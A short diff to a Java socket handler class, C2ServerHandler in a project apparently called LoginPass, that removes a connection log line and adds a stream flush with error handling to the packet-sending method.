@@ -37,7 +37,6 @@ public class C2ServerHandler extends Thread
             running = true;
             dis = new DataInputStream(c2socket.getInputStream());
             dos = new DataOutputStream(c2socket.getOutputStream());
-            System.out.println("[LoginPass] C2 connection from: " + c2socket);
         } catch (Exception ex) {
             ex.printStackTrace(System.err);
         }
@@ -67,11 +66,15 @@ public class C2ServerHandler extends Thread
         System.out.println("[LoginPass] C2 connection closed: " + c2socket);
     }
 
-    public void sendPacket(AbstractPacket packet)
-    {
+    public void sendPacket(AbstractPacket packet) {
         if (!running || c2socket.isClosed() || !c2socket.isConnected()) return;
         packet.writeData(dos);
-
+        try
+        {
+            dos.flush();
+        } catch (Exception ex) {
+            ex.printStackTrace(System.err);
+        }
     }
 
     public void end()
